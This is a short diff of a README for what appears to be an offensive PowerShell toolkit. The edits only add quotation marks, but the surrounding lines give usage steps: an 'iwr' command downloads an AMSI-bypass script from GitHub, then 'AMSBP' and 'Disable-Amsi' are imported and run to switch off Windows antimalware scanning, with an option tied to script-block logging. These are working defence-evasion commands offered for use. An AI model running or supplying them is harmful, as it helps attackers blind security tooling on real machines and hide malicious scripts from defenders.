@@ -10,7 +10,7 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-B
 ```
 
 ```powershell
-Import-Module -Name .\AMSBP.ps1 -Force
+Import-Module -Name ".\AMSBP.ps1" -Force
 AMSBP
 ```
 
@@ -28,8 +28,8 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-B
 ```
 
 ```powershell      
-Import-Module -Name .\Disable-Amsi.ps1 -Force
-Disable-Amsi -DontDisableBlockLogging true
+Import-Module -Name ".\Disable-Amsi.ps1" -Force
+Disable-Amsi -DontDisableBlockLogging "true"
 ```   
 
 <br />
